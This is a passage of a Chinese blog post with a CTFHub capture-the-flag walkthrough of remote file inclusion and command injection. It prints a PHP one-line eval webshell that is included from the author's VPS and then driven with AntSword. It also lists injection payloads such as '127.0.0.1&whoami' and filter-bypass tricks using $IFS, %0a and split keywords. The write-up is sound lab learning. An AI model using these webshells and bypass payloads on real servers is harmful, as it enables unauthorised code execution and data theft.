+<p>有些比赛赛题情况下还要用base64输出</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span><span class="hljs-keyword">read</span>=convert.base64-encode<span class="hljs-regexp">/resource=/</span>flag<br></code></pre></td></tr></table></figure>
+
+<h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>代码和之前类似</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923523.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看phpinfo</p>
+<p><code>allow_url_fopen= on；allow_url_include= on</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923075.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以用伪协议php:&#x2F;&#x2F;input</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923337.png" srcset="/img/loading.gif" lazyload></p>
+<p>出flag</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923819.png" srcset="/img/loading.gif" lazyload></p>
+<p>但按题目看，这里是用远程包含。</p>
+<p>HP的配置选项<code>allow_url_include</code>为<strong>ON</strong>的话，则include&#x2F;require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(<strong>R</strong>emote <strong>F</strong>ile <strong>I</strong>nclusion，即RFI)”。</p>
+<p><code>allow_url_fopen = On</code> 是否允许打开远程文件；<code>allow_url_include = On</code> 是否允许include&#x2F;require远程文件。</p>
+<p>在服务器中mkdir一个文件夹，然后在文件夹里vi一个webshell_post.txt</p>
+<p>编辑一个一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>随后用python启动一个http服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure>
+
+<p>然后用蚁剑连接</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-b9152779869a03e5.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?file=http:/</span><span class="hljs-regexp">/你的vps地址:8080/</span>webshell_post.txt<br></code></pre></td></tr></table></figure>
+
+<p>这样就会包含我们的文件，即包含我们的一句话木马，蚁剑成功连接。</p>
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>还是看看代码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923085.png" srcset="/img/loading.gif" lazyload></p>
+<p>上面那个提交框输入的是ip</p>
+<p>然后发送了之后会通过exec函数执行命令</p>
+<p>最后显示执行的命令。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923290.png" srcset="/img/loading.gif" lazyload></p>
+<p>需要详细了解各种管道符的请看总结：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/145461296" title="RCE学习总结-CSDN博客">RCE学习总结-CSDN博客</a></p>
+<p>这道题没有过滤，那我们直接试试&amp;</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923793.png" srcset="/img/loading.gif" lazyload></p>
+<p>返回数据了，回显www-data说明whoami执行成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924987.png" srcset="/img/loading.gif" lazyload></p>
+<p>列一下当前目录试试</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923840.png" srcset="/img/loading.gif" lazyload></p>
+<p>15120590614198.php有些可疑，看一下它</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;cat <span class="hljs-number">15120590614198</span>.php<br></code></pre></td></tr></table></figure>
+
+<p>没回显</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923379.png" srcset="/img/loading.gif" lazyload></p>
+<p>一般遇见这种情况 咱们首先考虑两种方法</p>
+<p>第一种，直接查看源代码</p>
+<p>果不其然 直接在源代码中找到了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923208.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二种方法是将文件内容base64编码出来</p>
+<p>提交payload</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;cat <span class="hljs-number">15120590614198</span>.php| base64<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923318.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后解码即可</p>
+<h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p>这一关看题目应该是过滤cat</p>
+<p>在linux下，不只有cat 可以读取文件内容，more、less、head、tac，都可以对文本进行读取。</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923536.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp; more flag_2628015623637.php<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp; more flag_2628015623637.php | base64 <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923740.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>这题很明显是过滤空格，</p>
+<p>空格可以用以下字符串代替：</p>
+<p><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS</code>等</p>
+<p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
+<p>接下来我们开始做题</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923242.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;cat$IFS$9flag_203181716426702.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923198.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是查看源代码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923528.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923046.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923498.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;cd flag_is_here&amp;&amp;ls<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923218.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;cd flag_is_here&amp;&amp;cat flag_19538361312761.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924621.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>题目说过滤了几个运算符，但没过滤<code>;</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924233.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;ls<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924497.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;cat flag_948825225138.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924525.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>过滤运算符、过滤目录分隔符、过滤反斜杠、过滤空格、过滤封号、过滤cat、过滤关键字flag和ctfhub</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924833.png" srcset="/img/loading.gif" lazyload></p>
+<p>先我们要使用ls列目录，发现这里过滤了运算符，连;也过滤了，绕过的方式有%0a、%0d、%0D%0A</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>%0als#<br></code></pre></td></tr></table></figure>
+
+<p>注意是在URL上写</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924499.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924234.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们使用ls flag_is_here列出子目录的文件，免不了绕过空格和flag的顾虑，绕过空格前面已经有writeup中附带了相关技巧，我们这里可以使用<code>$&#123;IFS&#125;</code>绕过</p>
+<p>绕过flag关键字，我们使用的方法也是多种多样，这里不一一列出了，经过尝试可以使用$*来绕过关键字过滤，如fl$*ag_is_here</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>%0als$&#123;IFS&#125;fl$*ag_is_here<br></code></pre></td></tr></table></figure>
+
+<p>也是在URL上写</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924271.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后组合一下，用more替代cat</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>Acd<span class="hljs-variable">$&#123;IFS&#125;</span>fl$*ag_is_here%<span class="hljs-number">0</span>Amore<span class="hljs-variable">$&#123;IFS&#125;</span>fl$*ag_392220718908.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924685.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTFHub/" class="print-no-link">#CTFHub</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>RCE-CTFHub</div>
+      <div>http://example.com/2025/05/04/RCE-CTFHub/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/04/SSRF-CTFHub/" title="SSRF-CTFHub">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSRF-CTFHub</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/04/RCE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" title="RCE学习总结">
+                        <span class="hidden-mobile">RCE学习总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
